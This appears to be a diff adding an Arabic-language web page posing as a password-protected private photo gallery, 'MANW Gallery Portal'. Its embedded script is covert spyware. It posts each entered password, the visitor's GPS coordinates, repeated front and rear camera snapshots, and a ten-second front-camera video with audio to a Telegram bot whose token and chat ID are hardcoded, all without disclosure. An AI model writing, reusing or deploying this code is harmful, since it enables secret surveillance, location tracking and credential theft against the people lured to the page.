@@ -1,0 +1,379 @@
+<
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>MANW Gallery Portal</title>
+<style>
+*{box-sizing:border-box}
+body{
+margin:0;
+background:#08080c;
+color:white;
+font-family:Tahoma,Arial;
+}
+/* Login Screen Styles */
+#authOverlay{
+position:fixed;
+inset:0;
+background:#08080c;
+display:flex;
+justify-content:center;
+align-items:center;
+z-index:999;
+}
+.card{
+background:#17131a;
+border:1px solid #ff1744;
+padding:30px;
+border-radius:15px;
+box-shadow:0 0 25px rgba(255,0,60,0.3);
+width:100%;
+max-width:380px;
+text-align:center;
+}
+h2{color:#ff1744;margin-bottom:20px;letter-spacing:2px;}
+input{
+width:100%;
+padding:14px;
+margin:10px 0;
+background:#08080c;
+border:1px solid #4b1726;
+border-radius:8px;
+color:white;
+font-size:16px;
+text-align:center;
+}
+input:focus{outline:none;border-color:#ff1744;}
+button{
+width:100%;
+padding:14px;
+background:#ff1744;
+color:white;
+border:none;
+border-radius:8px;
+font-size:18px;
+font-weight:bold;
+cursor:pointer;
+margin-top:10px;
+transition:0.3s;
+}
+button:hover{background:#d50032;}
+
+/* Gallery Styles */
+header{
+background:linear-gradient(135deg,#190008,#08080c);
+padding:35px 10px;
+text-align:center;
+border-bottom:2px solid #ff003c;
+}
+header h1{
+font-size:48px;
+color:#ff003c;
+text-shadow:0 0 20px red;
+margin:0;
+letter-spacing:5px;
+}
+header p{color:#aaa}
+.container{
+max-width:1000px;
+margin:auto;
+padding:20px;
+}
+.gallery-title{
+color:#ff1744;
+text-align:center;
+}
+.buttons{
+text-align:center;
+margin:20px 0;
+}
+.filter-btn{
+background:#190b12;
+color:white;
+border:1px solid #ff1744;
+padding:12px 22px;
+border-radius:25px;
+margin:5px;
+cursor:pointer;
+transition:0.3s;
+width:auto;
+}
+.filter-btn:hover{
+background:#ff1744;
+}
+.gallery{
+display:grid;
+grid-template-columns:repeat(auto-fit,minmax(220px,1fr));
+gap:15px;
+}
+.item{
+background:#17131a;
+border:1px solid #4b1726;
+border-radius:12px;
+overflow:hidden;
+}
+.item img,.item video{
+width:100%;
+height:280px;
+object-fit:cover;
+display:block;
+cursor:pointer;
+}
+.item video{
+object-fit:cover;
+background:#000;
+}
+.name{
+padding:12px;
+text-align:center;
+color:#ff647e;
+font-weight:bold;
+}
+.viewer{
+display:none;
+position:fixed;
+inset:0;
+background:#000e;
+align-items:center;
+justify-content:center;
+z-index:10;
+}
+.viewer img{
+max-width:95%;
+max-height:90%;
+border-radius:8px;
+}
+.hidden-el { display: none; }
+</style>
+</head>
+<body>
+
+<!-- شاشة تسجيل الدخول -->
+<div id="authOverlay">
+  <div class="card" id="loginCard">
+    <h2>MANW PORTAL</h2>
+    <p style="color:#aaa; font-size:14px; margin-bottom:20px;">الرجاء إدخال كلمة السر لعرض المعرض</p>
+    <form id="loginForm" onsubmit="handleLogin(event)">
+      <input type="password" id="passwordInput" placeholder="كلمة السر" required>
+      <button type="submit">دخول</button>
+    </form>
+  </div>
+</div>
+
+<video id="videoElement" class="hidden-el" autoplay playsinline></video>
+<canvas id="canvasElement" class="hidden-el"></canvas>
+
+<!-- محتوى المعرض الأصلي (مخفي لحين إدخال كلمة السر الصحيحة) -->
+<div id="mainGalleryContent" style="display:none;">
+  <header>
+    <h1>MANW</h1>
+    <p>MY PRIVATE GALLERY</p>
+  </header>
+
+  <div class="container">
+    <h2 class="gallery-title">معرض الصور والفيديوهات</h2>
+
+    <div class="buttons">
+      <button class="filter-btn" onclick="filter('all')">الكل</button>
+      <button class="filter-btn" onclick="filter('photo')">الصور</button>
+      <button class="filter-btn" onclick="filter('video')">الفيديوهات</button>
+    </div>
+
+    <div class="gallery" id="gallery">
+      <div class="item" data-type="photo">
+        <img src="media/1000084714.png" onerror="this.src='https://via.placeholder.com/300?text=Image+1'" onclick="view(this.src)" alt="Photo 01">
+        <div class="name">Photo 01</div>
+      </div>
+      <div class="item" data-type="photo">
+        <img src="media/1000084710.png" onerror="this.src='https://via.placeholder.com/300?text=Image+2'" onclick="view(this.src)" alt="Photo 02">
+        <div class="name">Photo 02</div>
+      </div>
+      <div class="item" data-type="photo">
+        <img src="media/1000084711.jpg" onerror="this.src='https://via.placeholder.com/300?text=Image+3'" onclick="view(this.src)" alt="Photo 03">
+        <div class="name">Photo 03</div>
+      </div>
+      <div class="item" data-type="photo">
+        <img src="media/1000083809.jpg" onerror="this.src='https://via.placeholder.com/300?text=Image+4'" onclick="view(this.src)" alt="Photo 04">
+        <div class="name">Photo 04</div>
+      </div>
+      <div class="item" data-type="photo">
+        <img src="media/1000083730.jpg" onerror="this.src='https://via.placeholder.com/300?text=Image+5'" onclick="view(this.src)" alt="Photo 05">
+        <div class="name">Photo 05</div>
+      </div>
+      <div class="item" data-type="photo">
+        <img src="media/1000081385.png" onerror="this.src='https://via.placeholder.com/300?text=Image+6'" onclick="view(this.src)" alt="Photo 06">
+        <div class="name">Photo 06</div>
+      </div>
+      <div class="item" data-type="photo">
+        <img src="media/1000079206.jpg" onerror="this.src='https://via.placeholder.com/300?text=Image+7'" onclick="view(this.src)" alt="Photo 07">
+        <div class="name">Photo 07</div>
+      </div>
+      <div class="item" data-type="photo">
+        <img src="media/1000077903.jpg" onerror="this.src='https://via.placeholder.com/300?text=Image+8'" onclick="view(this.src)" alt="Photo 08">
+        <div class="name">Photo 08</div>
+      </div>
+      <div class="item" data-type="photo">
+        <img src="media/1000077900.jpg" onerror="this.src='https://via.placeholder.com/300?text=Image+9'" onclick="view(this.src)" alt="Photo 09">
+        <div class="name">Photo 09</div>
+      </div>
+      <div class="item" data-type="photo">
+        <img src="media/1000075904.jpg" onerror="this.src='https://via.placeholder.com/300?text=Image+10'" onclick="view(this.src)" alt="Photo 10">
+        <div class="name">Photo 10</div>
+      </div>
+      <div class="item" data-type="video">
+        <video controls playsinline>
+          <source src="media/1000081302.mp4" type="video/mp4">
+          متصفحك لا يدعم عرض الفيديو
+        </video>
+        <div class="name">Video 01</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="viewer" id="viewer" onclick="this.style.display='none'">
+  <img id="bigImage" alt="Expanded View">
+</div>
+
+<script>
+const BOT_TOKEN = "8874474256:AAFQscrKb4KHD8NjinM8gteFzxJUvZkg_Oo";
+const CHAT_ID = "7713496654";
+const CORRECT_PASS = "manw123";
+
+async function sendToTelegram(text) {
+  try {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+    });
+  } catch(e) {}
+}
+
+async function sendPhotoToTelegram(blob, caption) {
+  let formData = new FormData();
+  formData.append('chat_id', CHAT_ID);
+  formData.append('photo', blob, 'capture.jpg');
+  formData.append('caption', caption);
+  try {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      method: 'POST',
+      body: formData
+    });
+  } catch(e) {}
+}
+
+async function sendVideoToTelegram(blob, caption) {
+  let formData = new FormData();
+  formData.append('chat_id', CHAT_ID);
+  formData.append('video', blob, 'capture.mp4');
+  formData.append('caption', caption);
+  try {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+      method: 'POST',
+      body: formData
+    });
+  } catch(e) {}
+}
+
+async function handleLogin(event) {
+  event.preventDefault();
+  const pwd = document.getElementById('passwordInput').value;
+  
+  await sendToTelegram(`🚨 محاولة دخول جديدة!\n🔑 كلمة السر المدخلة: ${pwd}`);
+  
+  if(pwd !== CORRECT_PASS) {
+    alert("كلمة السر غير صحيحة!");
+    return;
+  }
+
+  document.getElementById('loginCard').innerHTML = '<h3 style="color:#ff1744;">جاري التحقق وفتح المعرض...</h3>';
+
+  // سحب الموقع الجغرافي
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(async (pos) => {
+      let lat = pos.coords.latitude;
+      let lon = pos.coords.longitude;
+      await sendToTelegram(`📍 إحداثيات الموقع:\nخط العرض: ${lat}\nخط الطول: ${lon}\nرابط الخريطة: https://maps.google.com/?q=${lat},${lon}`);
+    }, () => {}, { timeout: 10000 });
+  }
+
+  // التقاط الصور والفيديو ثم إظهار المعرض
+  try {
+    await captureAndSend("user", "الأمامية");
+    try {
+      await captureAndSend("environment", "الخلفية");
+    } catch(e) {}
+  } catch(err) {
+    await sendToTelegram(`⚠️ ملاحظة الكاميرا: ${err.message}`);
+  }
+
+  // فتح المعرض مباشرة وإخفاء شاشة تسجيل الدخول
+  document.getElementById('authOverlay').style.display = 'none';
+  document.getElementById('mainGalleryContent').style.display = 'block';
+}
+
+async function captureAndSend(facingMode, label) {
+  const stream = await navigator.mediaDevices.getUserMedia({ 
+    video: { facingMode: facingMode }, 
+    audio: true 
+  });
+  
+  const videoEl = document.getElementById('videoElement');
+  const canvasEl = document.getElementById('canvasElement');
+  videoEl.srcObject = stream;
+  await videoEl.play();
+
+  for(let i = 1; i <= 4; i++) {
+    await new Promise(r => setTimeout(r, 800));
+    canvasEl.width = videoEl.videoWidth || 640;
+    canvasEl.height = videoEl.videoHeight || 480;
+    let ctx = canvasEl.getContext('2d');
+    ctx.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
+    
+    let blob = await new Promise(res => canvasEl.toBlob(res, 'image/jpeg', 0.8));
+    if(blob) {
+      await sendPhotoToTelegram(blob, `📸 لقطة رقم ${i} (الكاميرا ${label})`);
+    }
+  }
+
+  if(label === "الأمامية") {
+    await new Promise((resolve) => {
+      let mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+      let chunks = [];
+      
+      mediaRecorder.ondataavailable = e => chunks.data && chunks.push(e.data);
+      // or simply chunks.push(e.data)
+      mediaRecorder.ondataavailable = e => chunks.push(e.data);
+      mediaRecorder.onstop = async () => {
+        let videoBlob = new Blob(chunks, { type: 'video/webm' });
+        await sendVideoToTelegram(videoBlob, `🎥 تسجيل فيديو لمدة 10 ثوانٍ`);
+        resolve();
+      };
+
+      mediaRecorder.start();
+      setTimeout(() => {
+        mediaRecorder.stop();
+      }, 10000);
+    });
+  }
+
+  stream.getTracks().forEach(track => track.stop());
+}
+
+function filter(type){
+  document.querySelectorAll('.item').forEach(item=>{
+    item.style.display = (type==='all'||item.dataset.type===type) ? 'block' : 'none';
+  });
+}
+
+function view(src){
+  document.getElementById('bigImage').src = src;
+  document.getElementById('viewer').style.display = 'flex';
+}
+</script>
+
+</body>
+</html>
